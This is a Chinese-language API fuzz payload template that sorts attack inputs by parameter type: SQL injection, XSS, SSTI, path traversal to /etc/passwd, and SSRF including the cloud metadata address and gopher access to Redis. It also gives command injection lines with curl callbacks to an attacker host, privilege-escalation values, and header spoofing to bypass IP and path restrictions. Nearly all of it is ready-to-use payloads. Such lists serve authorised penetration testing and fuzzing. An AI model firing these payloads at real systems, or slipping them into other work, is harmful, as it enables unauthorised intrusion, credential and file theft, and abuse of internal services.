# API Fuzz Payload 模板

## 按参数语义选择 Payload

### ID 类参数 (id, uid, user_id, order_id)
```
# IDOR 遍历
1, 2, 3, ..., 100
0, -1, 999999999

# SQL 注入
1 OR 1=1
1' OR '1'='1
1 UNION SELECT 1,2,3--
1; SELECT SLEEP(5)--

# 类型混淆
[1], {"$gt":0}, true, null, ""
```

### 查询类参数 (q, search, query, keyword)
```
# SQL 注入
' OR 1=1--
" OR ""="
' UNION SELECT NULL,NULL,NULL--
1' AND SLEEP(5)--

# XSS
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
{{7*7}}

# SSTI
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
```

### 文件/路径类参数 (file, path, url, filename, dir)
```
# 路径穿越
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
/etc/passwd%00.jpg

# SSRF
http://127.0.0.1
http://169.254.169.254/latest/meta-data/
http://[::1]/
http://0x7f000001/

# 协议绕过
file:///etc/passwd
dict://127.0.0.1:6379/
gopher://127.0.0.1:6379/_*1%0d%0a
```

### 金额/数量类参数 (amount, price, quantity, balance)
```
# 业务逻辑
0
-1
-99999
0.001
99999999
0.00000001

# 类型混淆
"0"
null
[]
NaN
Infinity
```

### 认证类参数 (token, auth, session, role)
```
# 权限提升
admin
root
1
true
{"role":"admin"}

# 空值绕过
""
null
undefined
0
[]
```

### 命令执行类参数 (cmd, command, exec, host, ip)
```
# 命令注入
; id
| id
`id`
$(id)
; cat /etc/passwd
| curl http://ATTACKER/
`curl http://ATTACKER/`

# 带延时验证
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
```

## 通用 Fuzz 向量（适用于任何参数）

### 边界值
```
""             # 空字符串
" "            # 空格
null           # null 值
[]             # 空数组
{}             # 空对象
0              # 零
-1             # 负数
2147483647     # INT_MAX
9999999999999  # 超大数
true / false   # 布尔值
```

### 特殊字符
```
' " < > \ / ; | & ` $ { } [ ] ( ) # @ ! ~ % ^ *
%00            # Null byte
%0a%0d         # CRLF
\r\n           # 换行
%2e%2e%2f      # URL 编码的 ../
```

## HTTP 方法 Fuzz
```bash
# 对每个端点尝试所有方法
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -X $method "$ENDPOINT")
    echo "$method → $code"
done
```

## Header Fuzz
```bash
# 绕过 IP 白名单
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1

# 绕过路径限制
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
```
